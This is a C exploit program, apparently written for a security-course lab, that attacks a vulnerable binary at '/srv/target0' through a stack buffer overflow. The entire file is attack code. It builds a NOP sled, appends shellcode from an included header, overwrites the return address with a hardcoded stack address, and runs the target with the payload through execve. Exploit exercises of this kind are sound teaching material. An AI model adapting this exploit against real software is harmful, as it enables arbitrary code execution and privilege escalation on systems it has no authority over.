#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/srv/target0"

int main(void)
{
  char *args[3]; 
  char *env[1];

  char str[408];
  // Initialize the buffer with zeros
  memset(str, 0, 408);

  // Fill the beginning of the buffer with NOP instructions (0x90)
  for (int i = 0; i < 193; ++i)
  {
    strcat(str, "\x90");
  }

  // Append the actual shellcode to the end of the NOP sled
  strcat(str, shellcode);

  // Overwrite the return address multiple times with a specific address
  for (int i = 0; i < 38; ++i)
  {
    strcat(str, "\x84\xdb\xff\xff");
  }
  
  args[0] = TARGET;
  args[1] = str; 
  args[2] = NULL;
  
  env[0] = NULL;
  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}



